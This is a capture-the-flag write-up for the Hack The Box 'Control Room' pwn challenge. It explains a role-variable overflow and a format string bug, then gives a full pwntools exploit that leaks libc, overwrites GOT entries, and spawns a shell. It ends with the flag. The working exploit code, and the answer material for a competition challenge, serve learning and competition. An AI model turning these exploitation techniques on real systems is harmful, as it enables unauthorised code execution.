# Control Room WriteUp by Om Honrao (@Inv1s1bl3#7047)

## Challenge Description
```
After unearthing the crashed alien spacecraft you have hacked your way into it's interior. Nothing seems perticularily interesting until you find the spacecraft's control room. Filled with monitors, buttons and panels this room surely contains a lot of important information, including the coordinates of the underground alien vessels that you 've been looking for. You decide to start off by booting up the main computer. You hear an uncanny buzzing-like noise and then a monitor lights up requesting you to enter a username. Can you take control of the Control Room?
```

## Challenge Files
```bash
 - pwn_control_room.zip
    ./banner.txt
    ./control_room
    ./libc.so.6
```

## Challenge Solution
This was very frustrating challenge for me but somehow solved it. Lets start with basic analysis of binary with `checksec` and `file` command.
```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

I will talk straight to the point as i am not very good at explaining things. There are 2 bugs in the program.
1. The user role variable is 256 bytes away from our input so we can overflow and rewrite it to get the Captain role. But, ofc we know by running the file that Captain is not having the flag!
2. Format Strings vulnerability is present in Technician role by which we can leak out the stack!

Now, what are we supposed to do so there is `Ret2Libc` attack again. In short we leak the address of any one funtion present in libc and subtract the offset of it from libc base and we get the Libc base address! Using it we can calculate the address of system and then we can spawn a shell and get the flag!

##`Exploit.py`
```python
from pwn import *

elf = context.binary = ELF('control_room')

#p = process()
p = connect(Docker,Port)
libc = ELF('./libc.so.6', checksec=False)

# Change role
p.sendafter(b'username: ', b'a'*256)
p.sendlineafter(b'? (y/n)', b'n')
p.sendlineafter(b'size: ', b'256')
p.sendlineafter(b'username: ', b'quangba')
p.sendlineafter(b'\x3a\x20\x1b\x5b\x30\x6d', b'5')
p.sendlineafter(b'New role: ', b'1')

# Leaking the stack
p.sendlineafter(b'\x3a\x20\x1b\x5b\x30\x6d', b'1')
p.sendlineafter(b'Engine number [0-3]: ', b'-7')
p.sendlineafter(b'\tThrust: ', str(elf.sym['main']).encode())
p.sendlineafter(b'\tMixture ratio:', b'+')
p.sendlineafter(b'configuration? (y/n) \n', b'y')
p.sendlineafter(b'\x3a\x20\x1b\x5b\x30\x6d', b'1')
p.sendlineafter(b'Engine number [0-3]: ', b'-14')
p.sendlineafter(b'\tThrust: ', str(elf.plt['printf']).encode())
p.sendlineafter(b'\tMixture ratio:', b'+')
p.sendlineafter(b'configuration? (y/n) \n', b'y')

# Getting Libc base
p.sendlineafter(b'\x3a\x20\x1b\x5b\x30\x6d', b'6')
p.sendlineafter(b'username: ', b'%77$p%300c')
libc.address = int(p.recv(14).strip(), 16) - 0x29e40
log.info('libc.address: ' + hex(libc.address))
print('Libc at: ' + hex(libc.address))
p.sendlineafter(b'? (y/n)', b'n')
p.sendlineafter(b'size: ', b'256')
p.sendlineafter(b'username: ', b'quangba')
p.sendlineafter(b'\x3a\x20\x1b\x5b\x30\x6d', b'5')
p.sendlineafter(b'New role: ', b'1')

# Call system
system = libc.sym['system']
p.sendlineafter(b'\x3a\x20\x1b\x5b\x30\x6d', b'1')
p.sendlineafter(b'Engine number [0-3]: ', b'-17')
p.sendlineafter(b'\tThrust: ', b'+')
p.sendlineafter(b'\tMixture ratio:', str(system).encode())
p.sendlineafter(b'configuration? (y/n) \n', b'y')

# Get shell
p.sendlineafter(b'\x3a\x20\x1b\x5b\x30\x6d', b'6')
p.sendlineafter(b'username: ', b'%200c')
p.sendlineafter(b'? (y/n)', b'n')
p.sendlineafter(b'size: ', b'100')
p.sendlineafter(b'username: ', b'/bin/sh\x00')

# cat flag.txt!
p.interactive()
```

## Flag
```
HTB{pr3p4r3_4_1mp4ct~~!}
```